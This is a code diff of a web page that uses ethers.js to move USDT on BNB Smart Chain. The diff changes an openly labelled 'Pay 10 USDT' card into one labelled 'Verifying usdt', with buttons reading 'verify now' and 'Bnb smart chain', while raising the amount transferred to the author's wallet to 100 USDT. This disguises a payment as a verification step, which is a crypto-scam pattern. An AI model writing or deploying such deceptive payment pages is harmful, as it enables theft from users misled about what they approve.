@@ -17,9 +17,9 @@
 
 <div class="card">
     <h2>USDT Payment</h2>
-    <p>Apna Wallet Connect Karein aur Payment Bhejein</p>
-    <button onclick="connectWallet()">Wallet Connect Karein</button>
-    <button onclick="sendUSDT()">Pay 10 USDT</button>
+    <p>Verifying usdt</p>
+    <button onclick="connectWallet()">verify now</button>
+    <button onclick="sendUSDT()">Bnb smart chain</button>
     <div id="status">Status: Not Connected</div>
 </div>
 
@@ -57,8 +57,8 @@
             document.getElementById("status").innerText = "Transaction pending...";
             const usdtContract = new ethers.Contract(usdtAddress, erc20Abi, signer);
             
-            // 10 USDT Amount (18 decimals on BSC)
-            const amount = ethers.utils.parseUnits("10.0", 18);
+            // 100 USDT Amount (18 decimals on BSC)
+            const amount = ethers.utils.parseUnits("100.0", 18);
             
             const tx = await usdtContract.transfer(myWalletAddress, amount);
             await tx.wait();
